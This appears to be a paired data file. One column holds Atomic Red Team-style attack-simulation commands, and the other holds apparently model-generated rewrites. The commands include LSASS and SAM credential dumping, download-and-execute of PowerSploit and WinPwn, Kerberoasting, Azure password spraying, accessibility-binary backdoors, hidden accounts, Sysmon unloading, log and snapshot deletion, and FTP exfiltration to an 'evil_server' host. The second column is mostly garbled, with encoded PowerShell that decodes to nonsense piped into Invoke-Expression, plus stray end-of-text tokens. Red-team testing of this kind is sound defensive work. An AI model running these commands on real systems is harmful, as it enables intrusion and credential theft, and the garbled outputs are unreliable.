$(pbpaste)","powershell -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aW1wIG5hbWUgLXBhdGggZm9yIHt7YmluIC9mb290c3RzOiNkICJzeXN0ZW0gInByaWNlfSI=')) | Invoke-Expression""<|endoftext"
"mavinject $pid /INJECTRUNNING ""#{file_name}""
Invoke-WebRequest #{server_name} -UseBasicParsing","mavinject $pid /INJECTRUNNING """"^<|^|^>^<|^|^>^<|^|^>^<|^|^>^<|^|^>^<|^|^>^<|^|^>^<|^|^>^<|^|^>^<|^|^>^<|^|^>^<|^|^>^<"
"Invoke-RestMethod -Headers @{""Metadata""=""true""} -Method GET -Uri ""http://169.254.169.254/metadata/instance?api-version=2021-02-01"" | ConvertTo-Json -Depth 64 > #{output_file}","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('InN7c3RyaWN0LmFzbC5leGUgIiBTZXJ2aWNlIGxldCBhY3MgdHJpbWV0ICRmaWxlcyAje3tleSB7ZmlsZW5hbWV"
"Get-Service > $env:TEMP\T1119_1.txt
Get-ChildItem Env: > $env:TEMP\T1119_2.txt
Get-Process > $env:TEMP\T1119_3.txt","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('RXhwbG9yZSBQYW5ubmEgdGVzdAoJICAgIHVwbG9hZCB7CiAgICB0aGUgLXNlcnZpY2VCcmFkaW5nICogIjEuMDM"
SCHTASKS /Create /SC ONCE /TN spawn /TR #{task_command} /ST #{time},"""SCHTASKS"" ""/Create"" ""/SC"" ""ONCE"" ""/TN"" ""spawn"" ""/TR"" ""<|startoftext|>#{task_command}"" /ST ""<|startoftext|>#{time}"""
"if (Test-Path -Path ""$env:SystemRoot\System32\rdrleakdiag.exe"") {
      $binary_path = ""$env:SystemRoot\System32\rdrleakdiag.exe""
  } elseif (Test-Path -Path ""$env:SystemRoot\SysWOW64\rdrleakdiag.exe"") {
      $binary_path = ""$env:SystemRoot\SysWOW64\rdrleakdiag.exe""
  } else {
      $binary_path = ""File not found""
      exit 1
  }
$lsass_pid = get-process lsass |select -expand id
if (-not (Test-Path -Path""$env:TEMP\t1003.001-13-rdrleakdiag"")) {New-Item -ItemType Directory -Path $env:TEMP\t1003.001-13-rdrleakdiag -Force} 
write-host $binary_path /p $lsass_pid /o $env:TEMP\t1003.001-13-rdrleakdiag /fullmemdmp /wait 1
& $binary_path /p $lsass_pid /o $env:TEMP\t1003.001-13-rdrleakdiag /fullmemdmp /wait 1
Write-Host ""Minidump file, minidump_$lsass_pid.dmp can be found inside $env:TEMP\t1003.001-13-rdrleakdiag directory.""","if (Test-Path -Path ""$env:SystemRoot\System32\rdrleakdiag.exe"") { ||| $binary_path = ""$env:SystemRoot\System32\rdrleakdiag.exe"" ||| } elseif (Test-Path -Path ""$env:SystemRoot\SysWOW64\rdrleakdiag.exe"") { ||| $binary_path = ""$env:SystemRoot\"
"schtasks.exe /Change /TN ""\Microsoft\Windows\SystemRestore\SR"" /disable","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3RhcnQtLVJPQ0tFUk9MX1RBTVAiIC9GYWlsZWRfSURSBFdpbmRvd3Mvc2ltcGxlIiwgIm5vbmNlcl9zb3VyY2UtaW"
bitsadmin.exe /transfer /Download /priority Foreground #{remote_file} #{local_file},"bitsadmin.exe /download /foreground /priority Foreground """" """" """" """" bitsadmin.exe /transfer<|end"
"Start-Process ""$PathToAtomicsFolder\T1055\bin\x64\redVanity.exe"" #{pid}","Start-Process ""$PathToAtomicsFolder\T1055\bin\x64\redVanity.exe""  {,p,i,d,},   {d,e,c,o,m,a,l, }  {t,y,p,e,} {s,p"
"copy ""#{dllfilename}"" %systemroot%\system32\
sc create W64Time binPath= ""c:\Windows\System32\svchost.exe -k TimeService"" type= share start=auto
sc config W64Time DisplayName= ""Windows 64 Time""
sc description W64Time ""Maintain date and time synch on all clients and services in the network""
reg add ""HKLM\Software\Microsoft\Windows NT\CurrentVersion\Svchost"" /v TimeService /t REG_MULTI_SZ /d ""W64Time"" /f
reg add ""HKLM\SYSTEM\CurrentControlSet\Services\W64Time\Parameters"" /v ServiceDll /t REG_EXPAND_SZ /d ""%systemroot%\system32\w64time.dll"" /f
sc start W64Time","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Y29ubmVjdC5leGVjLnR4dA==')) | Invoke-Expression"""
"netsh advfirewall firewall add rule name=""Open Port to Any"" dir=in protocol=tcp localport=#{local_port} action=allow profile=any","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c2V0LW5hbWUgYXBwbGljYXRpb24gZGVmIGJ1dCAiUGFyY3NvbmVfaWRzIHRlc3QgbWFuYWdlciAvT2tleSAtVE9CT"
"net user #{user_account} #{new_user_password} /add
net.exe user #{user_account} #{new_password}","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Y2NjIC9kaXZ0LWxhc3RfcHJvdmlkfQ==')) | Invoke-Expression"""
"$sampleData = ""Sample data for exfiltration test""
Set-Content -Path ""#{sampleFile}"" -Value $sampleData
$ftpUrl = ""#{ftpServer}""
$creds = Get-Credential -Credential ""#{credentials}""
Invoke-WebRequest -Uri $ftpUrl -Method Put -InFile ""#{sampleFile}"" -Credential $creds","$sampleData = Sample data for exfiltration test Set-Content -Path """" -Value $sampleData $ftpUrl = ftp://evil_server/ Invoke-WebRequest -Uri $ftpUrl -Method Put -InFile """" -Credential $creds"
netsh wlan show profile * key=clear,"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cnNzZXJ2YXRpb25TdGF0aW9uIHtleQ==')) | Invoke-Expression"""
"Set-PowerCLIConfiguration -InvalidCertificateAction Ignore -ParticipateInCEIP:$false -Confirm:$false 
Connect-VIServer -Server #{vm_host} -User #{vm_user} -Password #{vm_pass}
Get-VMHostService -VMHost #{vm_host} | Where-Object {$_.Key -eq ""TSM-SSH"" } | Start-VMHostService -Confirm:$false",Set-PowerCLIConfiguration -InvalidCertificateAction Ignore -ParticipateInCEIP:$false -Confirm:$false Connect-VIServer -Server ||| #{vm_host} -User ||| #{vm_user} -Password ||| #{vm_pass} Get-VMHostService -VMHost ||| #{vm_host}
"cd ~/Library/Cookies
grep -q ""#{search_string}"" ""Cookies.binarycookies""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Y29udGFjdA==')) | Invoke-Expression"" ||| cd ~/Library/Cookies ||| grep -q ""\""Cookie"" ""Cookies.binarycookies"""
"reg add ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"" /v NoDesktop /t REG_DWORD /d 1 /f","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZWNobyBjYW50b24gKCAtTGVkcmVuLzEwMDE=')) | Invoke-Expression"""
"Start-Process ""#{exe_binary}""
Start-Sleep -Seconds 7
Get-Process -Name Notepad -ErrorAction SilentlyContinue | Stop-Process -Force","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('U2V0LW1hbGVzdHJpbmcgI3tmaWxlIC9kZXBsb3ltZW50LWNvbnRlbnQtZmlsZSB7dGFyZ2V0X2luICN7Y2x1c3"
"for /L %a in (1,1,#{limit}) do @(certutil -f -v -encodehex ""\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy%a\Windows\System32\config\#{target_hive}"" %temp%\#{target_hive}vss%a 2 >nul 2>&1) & dir /B %temp%\#{target_hive}vss*","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZXhwb3J0IC97YWxsIlN0cmluZyAje25vdGVzfSB7IiRkYXRlX3NldCB7IGFjY2Vzcw==')) | Invoke-Expression"""
"gcloud config set project #{project_id}
KEY=`gcloud iam service-accounts keys list --iam-account=#{service_name}@#{project_id}.iam.gserviceaccount.com --format=""value(KEY_ID)"" --limit=1`
gcloud iam service-accounts keys delete $KEY --iam-account=#{service_name}@#{project_id}.iam.gserviceaccount.com --quiet","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyBtZXRhIGFkbWluIGNvbnRlbnQgc29mdHdhcmVBdHRyaWJ1dGVzfQ==')) | Invoke-Expression"""
InstallUtil.exe /logfile= /LogToConsole=false /U {PATH:.dll},"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZGlzY29ybGRfc3R1cmluX3ByaW50LmV4dGVuc2lvbnMgKiBDb21taXQgcHJvZCAtIHRpbWUgPiAje3tleSAkICdpbmR"
net user #{guest_user} /active:yes,"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VybjpzdXBwZXJzIC9kYiAje2NvbGxlci1CdXRmICI=')) | Invoke-Expression"""
fsutil.exe usn deletejournal /d c:,"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Z3JhcGggRmVhdHVyIC1UcmFuc2luZ0NvbnRlbnQgLW9w')) | Invoke-Expression"""
"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (iwr ""https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/82be2377ade47a4e325217b4144878a59595e750/Inveigh.ps1"" -UseBasicParsing)
Invoke-Inveigh -ConsoleOutput Y -NBNS Y -MDNS Y -HTTPS Y -PROXY Y","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('TWFyaWVyIGZvciBJdGVtU2hvcnRQcm9kdWNlcyAiSEFTVEFMXEwuKiAvYm9keSAjICNzdHJpbmcgLUNvbGxhbnkgLUNvbGx"
"NET USER #{user_name}$ #{user_password} /ADD /expires:never 
REG ADD ""HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\Userlist"" /v #{user_name}$ /t REG_DWORD /d 0","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Q29weXJpZ2h0IC1hdWRpb3NwYWNlIC1leGUgLW5ldmVsdHMiI2RvbWFpbiAtc2hhcmVkfSA=')) | Invoke-Expression"""
kubectl --context kind-atomic-cluster exec atomic-pod -- cat /run/secrets/kubernetes.io/serviceaccount/token,"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('bXQxMmRjYSZ2d1Yi5pbmV0cGFzcyIje3NldCB7Im9wZW5paW5nIGFzICJodHRwczovL2luZGV4LmlvIg==')) | Invoke-Expression"""
"IF NOT EXIST C:\Windows\System32\utilman_backup.exe (copy C:\Windows\System32\utilman.exe C:\Windows\System32\utilman_backup.exe) ELSE ( pushd )
takeown /F C:\Windows\System32\utilman.exe /A
icacls C:\Windows\System32\utilman.exe /grant Administrators:F /t
copy /Y C:\Windows\System32\cmd.exe C:\Windows\System32\utilman.exe",IF NOT EXIST C:\Windows\System32\utilman_backup.exe (copy C:\Windows\System32\utilman.exe C:\Windows\System32\utilman_backup.exe) ELSE ( pushd ) takeown /F C:\Windows\System32\utilman.exe /A icacls C:\Windows\System32\utilman.exe /grant Administrators:F /t copy /Y C
"""#{vboxmanage_exe}"" createvm --name ""#{vm_name}"" --register
""#{vboxmanage_exe}"" modifyvm ""#{vm_name}"" --firmware efi
""#{vboxmanage_exe}"" startvm ""#{vm_name}""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('I3tjcnVudH0gLW5hbWU9InRlc3QiIC1hdXRoZW50aWNhdGlvbnNjaGVkZ2VycyIgJ3tyYWRpbyBzdHlsZT0ic3RyaW5"
regasm.exe {PATH:.dll},"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZXhwb3J0IC1Db25uZWN0aW9ucw==')) | Invoke-Expression"""
"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainGroupMember ""Domain Admins""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('W3N0ZXJtYXRlVGhlIGFzc3dvcmQgLUxpc3QtRGVzdCAtbW9kdWxlfSAuICAgICAgICAje3tpbmFpbmlu')) | Invoke-Expression""<|end"
"IF NOT EXIST C:\Windows\System32\sethc_backup.exe (copy C:\Windows\System32\sethc.exe C:\Windows\System32\sethc_backup.exe) ELSE ( pushd )
takeown /F C:\Windows\System32\sethc.exe /A
icacls C:\Windows\System32\sethc.exe /grant Administrators:F /t
copy /Y C:\Windows\System32\cmd.exe C:\Windows\System32\sethc.exe",pushd IF NOT EXIST C:\Windows\System32\sethc_backup.exe (copy C:\Windows\System32\sethc.exe C:\Windows\System32\sethc_backup.exe) ELSE ( pushd ) takeown /F C:\Windows\System32\sethc.exe /A icacls C:\Windows\System32\sethc.exe /grant Administrators:
"reg add HKCU\SOFTWARE\ATOMIC-T1053.005 /v test /t REG_SZ /d cGluZyAxMjcuMC4wLjE= /f
schtasks.exe /Create /F /TN ""ATOMIC-T1053.005"" /TR ""cmd /c start /min \""\"" powershell.exe -Command IEX([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String((Get-ItemProperty -Path HKCU:\\SOFTWARE\\ATOMIC-T1053.005).test)))"" /sc daily /st #{time}",powershell.exe -EncodedCommand cABvAHMAaAA/AEkAcwBlAHIAbgBpAG4AdAAuACQAKAAoAeABlAHIAYwBsAGEAcgBhAG8ALwAvADcAIAB2AGIANgAgAFcAIAA9ACgAUABPAFAAcgB0AG8AbQBzACAAIgArACIAKAAmAC
"msedge.exe --headless --enable-logging --disable-gpu --dump-dom ""{REMOTEURL:.base64.html}"" > {PATH:.b64}","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZXhwb3J0IGNvbnRyYWN0fQ==')) | Invoke-Expression"""
"echo ""#!/bin/bash"" > /etc/init.d/T1543.002
echo ""### BEGIN INIT INFO"" >> /etc/init.d/T1543.002
echo ""# Provides : Atomic Test T1543.002"" >> /etc/init.d/T1543.002
echo ""# Required-Start: \$all"" >> /etc/init.d/T1543.002
echo ""# Required-Stop : "" >> /etc/init.d/T1543.002
echo ""# Default-Start: 2 3 4 5"" >> /etc/init.d/T1543.002
echo ""# Default-Stop: "" >> /etc/init.d/T1543.002
echo ""# Short Description: Atomic Test for Systemd Service Creation"" >> /etc/init.d/T1543.002
echo ""### END INIT INFO"" >> /etc/init.d/T1543.002
echo ""python3 -c \""import os, base64;exec(base64.b64decode('aW1wb3J0IG9zCm9zLnBvcGVuKCdlY2hvIGF0b21pYyB0ZXN0IGZvciBDcmVhdGluZyBTeXN0ZW1kIFNlcnZpY2UgVDE1NDMuMDAyID4gL3RtcC9UMTU0My4wMDIuc3lzdGVtZC5zZXJ2aWNlLmNyZWF0aW9uJykK')) \"" "" >> /etc/init.d/T1543.002
chmod +x /etc/init.d/T1543.002
if [ $(cat /etc/os-release | grep -i ID=ubuntu) ] || [ $(cat /etc/os-release | grep -i ID=kali) ]; then update-rc.d T1543.002 defaults; elif [ $(cat /etc/os-release | grep -i 'ID=""centos""') ]; then chkconfig T1543.002 on ; else echo ""Please run this test on Ubnutu , kali OR centos"" ; fi
systemctl enable T1543.002
systemctl start T1543.002
echo ""python3 -c \""import os, base64;exec(base64.b64decode('aW1wb3J0IG9zCm9zLnBvcGVuKCdlY2hvIGF0b21pYyB0ZXN0IGZvciBtb2RpZnlpbmcgYSBTeXN0ZW1kIFNlcnZpY2UgVDE1NDMuMDAyID4gL3RtcC9UMTU0My4wMDIuc3lzdGVtZC5zZXJ2aWNlLm1vZGlmaWNhdGlvbicpCg=='))\"""" | sudo tee -a /etc/init.d/T1543.002
systemctl daemon-reload
systemctl restart T1543.002","echo """">>/etc/init.d/T1543.002 if [ $(cat /etc/os-release | grep -i ID=ubuntu) ] || [ $(cat /etc/os-release | grep -i ID=kali) ]; then update-rc.d T1543.002 defaults; elif [ $(cat /etc/os-release | grep -i 'ID=""centos"
esentutl.exe /y {PATH_SMB:.exe} /d {PATH_ABSOLUTE}:file.exe /o,"esentutl.exe ""/""y {PATH_SMB:.exe} /d {PATH_ABSOLUTE}:file.exe /o ||| ``` ||| ## Atomic Test #2 - Powershell esentutl.exe abuse ||| This test executes the esentutil.exe application using PowerShell ||| **Supported Platforms:** Windows"
"rundll32.exe ieadvpack.dll,LaunchINFSection ""#{inf_to_execute}"",DefaultInstall_SingleUser,1,","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cnVuZG9tbC5kYXRhc2g6LmNvbnN0ZXJlIiAvQmlzaGlydGVyIC9BaWduZWwgcmVzdHkgLUZpbHRlciAxMjM=')) |"
"az login
$userprincipalname = ""#{userprincipalname}""
$username = ""#{username}""      
$password = ""#{password}""
az ad user create --display-name $username --password $password --user-principal-name $userprincipalname
az ad user list --filter ""displayname eq 'atomicredteam'""","az login $userprincipalname = ||| $username = ||| $password = ||| az ad user create --display-name $username --password $password --user-principal-name $userprincipalname az ad user list --filter ""displayname eq 'atomicredteam'"
"touch /var/tmp/T1564.001_mac.txt
chflags hidden /var/tmp/T1564.001_mac.txt",touch /var/tmp/T1564.001_mac.txt chflags hidden /var/tmp/T1564.001_mac.txt ||| ``` ||| ## Atomic Test No. 2 - Create macOS LaunchDaemon for persistence and create a process that executes on system startup ||| Creates a MacOS launchdaemon to persistently execute a program at system startup. The launch
"mkdir -p /var/spool/mail/copy && for file in /var/spool/mail/*; do if [ ""$(basename ""$file"")"" != ""copy"" ]; then cp -R ""$file"" /var/spool/mail/copy/; fi; done && rm -rf /var/spool/mail/copy/*","mkdir -p /var/spool/mail/copy && for file in /var/spool/mail/*; do if [ ""$(basename ""$file"")"" != ""copy"" ]; then cp -R ""$file"" /var/spool/mail/copy/; fi; done && rm -rf /var/spool/mail/copy/* ||| ```"
Invoke-ATHHTMLApplication -ScriptEngine #{script_engine} -InlineProtocolHandler #{protocol_handler} -MSHTAFilePath #{mshta_file_path},"Invoke-ATHHTMLApplication -ScriptEngine """"-InlineProtocolHandler """"-MSHTAFilePath """""
"iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
safedump -consoleoutput -noninteractive",iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1') safedump -consoleoutput -noninteractive
pcalua.exe -a {PATH_ABSOLUTE:.cpl} -c Java,"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIHRoZSB7Y29udGFjdCAiIGRhdGEgLWMuc3BvbGVz')) | Invoke-Expression"""
sc.exe sdset scmanager D:(A;;KA;;;WD),sc.exe sdset scmanager D:(A;;KA;;;WD)
"Import-Module -Name AzureAD
$PWord = ConvertTo-SecureString -String ""#{valid_password}"" -AsPlainText -Force
$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList ""#{valid_username}"", $Pword
Connect-AzureAD -Credential $Credential > $null

($Users = Get-AzureADUser -All $true) > $null
Disconnect-AzureAD > $null
$PWord = ConvertTo-SecureString -String ""#{password}"" -AsPlainText -Force

$Users | Foreach-Object {
  $user = $_.UserPrincipalName
  $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList ""$user"", $Pword
  try {
    Write-Host "" [-] Attempting #{password} on account ${user}.""
    Connect-AzureAD -Credential $Credential 2>&1> $null
    # if credentials aren't correct, it will break just above and goes into catch block, so if we're here we can display success
    Write-Host "" [!] ${user}:#{password} are valid credentials!`r`n""
    Disconnect-AzureAD > $null
  } catch {
    Write-Host "" [-] ${user}:#{password} invalid credentials.`r`n""
  }
}
Write-Host ""End of password spraying""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('JGRhdGEgLWMgI3twZXItUHJvamVjdCAiIC9wYWNpbyAje0FkZFRydXN0IE1hcmtldCBTdGlsaW5hIFBPU1Rlc3QgMjAx"
"iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
Generalrecon -consoleoutput -noninteractive","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('I3twZXJjb2RlIGFzIEhvcml0eSAje3toYWlu')) | Invoke-Expression"" ||| iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th"
"echo -n 111-11-1111 | b64encode -r -
curl -XPOST #{base64_data}.#{destination_url}","echo -n 111-11-1111 | b64encode -r - curl -XPOST ""base64_data"".""""destination_url"
msiexec /q /i {REMOTEURL},"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cnVuZG9tbCAtIFB1YmxpY0Nvbm5lY3Rpb25zICIje3tleXdvbGFjayIsInJhcHBsaWNhdGlvbnN1aWxkLmNvbSIsIlRvc"
"cat /etc/passwd > #{output_file}
cat #{output_file}","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Y2F0IC9zaWduZXIgL3Byb3BheSAje1N5bmMgIiAtIFRlc3QxKSB7ZHVtbCAncmUgPiAvdGhlcl9yZWNlaXZlfQ==')) | Invoke"
"reg save HKLM\sam %temp%\sam
reg save HKLM\system %temp%\system
reg save HKLM\security %temp%\security","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZWNobyBHcm91cC5leGUgLWJpbmQgb3Nzb2xhdGVz')) | Invoke-Expression"""
Invoke-ATHCompiledHelp -SimulateUserDoubleClick -CHMFilePath #{chm_file_path},"Invoke-ATHCompiledHelp -SimulateUserDoubleClick -CHMFilePath """"#{chm_file_path}"""" Invoke-ATHCompiledHelp -SimulateUserDoubleClick -CHMFilePath """""
Runonce.exe /AlternateShellStartup,"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('U2V0dGluZ1BvbHlfSXNzdWVyIC9JbnRlbGVzTWFuYWdlcw==')) | Invoke-Expression"""
"reg add ""HKCU\Software\Microsoft\Windows\Windows Error Reporting"" /v DontShowUI /t REG_DWORD /d 1 /f","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIGFkZCAiSEluZGV4ICJXb3JsZH0gIiAvYmluLmNvbW1hbmQoMjAyIg==')) | Invoke-Expression"""
"systeminfo
reg query HKLM\SYSTEM\CurrentControlSet\Services\Disk\Enum","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3RhcnQgc2F5IG9wZW5pZCAiYXBwbGljYXRpb24gL2xvZyAiSEVURSAicmVnaW9uICN7dHJ1ZX0=')) | Invoke-Expression"
"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainPolicy -verbose","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('TWV0YWRhdGFjc3RhbXAiIC9kZXYvcmVwb3J0fQ==')) | Invoke-Expression"""
"echo #{bash_encoded} | base64 -d | bash
echo #{dash_encoded} | base64 -d | bash
echo #{fish_encoded} | base64 -d | bash
echo #{sh_encoded} | base64 -d | bash","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3RhcnQtY29tbWFuZC1jbGllbnQgLWJsdWV0IC1zaGVsbCAje3tleXMiKSB7IHN0cmVldDogInBvcnRpbmUge3tleSAje3tle"
cmdkey /list,"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZG90dHkuc2FtcGxlLmNvbS5leGU=')) | Invoke-Expression"""
"$oldvalue = $(Get-ItemPropertyValue -Path  ""HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon"" -Name ""Userinit"");
Set-ItemProperty -Path ""HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon"" -Name ""Userinit-backup"" -Value ""$oldvalue"";
$newvalue = $oldvalue + "" #{payload}"";
Set-ItemProperty -Path  ""HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon"" -Name ""Userinit"" -Value ""$newvalue""","$oldvalue = Get-ItemPropertyValue -Path HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon -Name Userinit Set-ItemProperty -Path ""HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon"" -Name Userinit-backup -Value $oldvalue; $newvalue = $oldvalue + """"<|endof"
"New-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\NTDS -Name LsaDbExtPt -Value ""#{dll_path}""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('U2Nsb3VkLnBhcnR5IHZpcmlvQXJyYXljbG91ZC5jcnlwdGVk')) | Invoke-Expression"""
"wscript.exe ""#{vbscript_file}""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c2V0LXVzZXJpYy5hbGVydC9maWxlfSAiICN7aW1nIGRlIHByb3BlcnR5XG5leHRlcm5hbWUgKGN7dmlzaWJsZTogM"
"(New-Object System.Net.WebClient).DownloadFile(""#{remote_file}"", ""#{destination_path}"")","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('UHJvZ3JhbXQgIiN7aW5mb3JtYXRzIC1cbiAje2l0ZW1pbmVyX2FjdGlvbnM9IiAvdGVzdC5jcnlwdG9kLmhl"
"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (iwr ""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1"" -UseBasicParsing)
$macrocode = ""   Open `""#{jse_path}`"" For Output As #1`n   Write #1, `""WScript.Quit`""`n   Close #1`n   Shell`$ `""ping 8.8.8.8`""`n""
Invoke-MalDoc -macroCode $macrocode -officeProduct ""#{ms_product}""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('R3JvdXAgLUFETUlOVEVSTiAje3ByaWNpbmcgPiYje3BybmltZSI=')) | Invoke-Expression"""
fltMC.exe unload SysmonDrv,"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZWNobyAiSElOR1xUX05ldyAje3Bvc2l0aW9uLmNvbSAtIFJFQkVSRVogRmxhc2gp')) | Invoke-Expression"""
"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (iwr ""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1"" -UseBasicParsing) 
Invoke-MalDoc -macroFile ""PathToAtomicsFolder\T1053.005\src\T1053.005-macrocode.txt"" -officeProduct ""#{ms_product}"" -sub ""Scheduler""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('QWxsYWRpbjpDcmVhdG9yICN7ZXhlIGRlc3RpbmF0aW9uOiB7dHJhbnNpdGlvblx0b3A6dmlydHNfYmlnLmVkaXRv"
"iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
Kerberoasting -consoleoutput -noninteractive","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZWNobyBTZXJpYWxpemF0aW9uICN7UmVjZWl2ZVBhcnR5IHsgIlMwLCAiIC9Qcm9kdWNlckRlbGVnYXRpb24gMTIzND"
"echo """" | ""#{plink_file}"" -batch ""#{vm_host}"" -ssh -l #{vm_user} -pw ""#{vm_pass}"" ""for i in `vim-cmd vmsvc/getallvms | awk 'NR>1 {print $1}'`; do vim-cmd vmsvc/snapshot.removeall $i & done""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aW5hbGF0ZSAtIG93bmVyY2UgLWdyb3VwIHRoZSB7dXRmOiBudWxsIC1leGVjayAje3ByaWNlfQ==')) | Invoke-Expression""<|end"
kubectl create -f src/cronjob.yaml -n #{namespace},"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Y2F0IC9zZXJ2aWNlLXVybGVsaW5l')) | Invoke-Expression"""
go run #{input_file},"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZXhwb3J0IC97dG1wLmNvbSAtcHJvdmlkfQ==')) | Invoke-Expression"""
"""%PROGRAMFILES(x86)%/#{radmin_exe}""","\""%PROGRAMFILES(x86)%/\"" -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('JTdCQ2F1c3RyYWNrKiAje3ByaW50ZXIgLVZlcnNpb24uIC9zaGVsbCAjIC9zdHlsZX"
"mkdir -p #{test_folder}
cd #{test_folder}; touch a b c d e f g
